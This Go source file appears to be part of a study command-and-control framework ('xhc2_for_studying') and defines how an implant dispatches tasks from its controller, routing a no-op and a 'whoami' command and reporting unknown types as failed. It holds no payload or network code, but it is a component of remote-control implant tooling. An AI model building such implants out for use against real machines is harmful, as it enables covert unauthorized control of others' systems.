package task

import (
	"fmt"
	"time"
	
	"xhc2_for_studying/protocol"
)

func Dispatch(task protocol.Task, implantID string) *protocol.TaskResult {
	switch task.Type {
	case protocol.TaskTypeNoop:
		return handleNoop(task, implantID)
	case protocol.TaskTypeWhoami:
		return handleWhoami(task, implantID)
	}
	
	return &protocol.TaskResult{
		TaskID:    task.ID,
		ImplantID: implantID,
		Status:    protocol.TaskStatusFailed,
		Error:     fmt.Sprintf("unknown task type: %s", task.Type),
		Completed: time.Now(),
	}
}
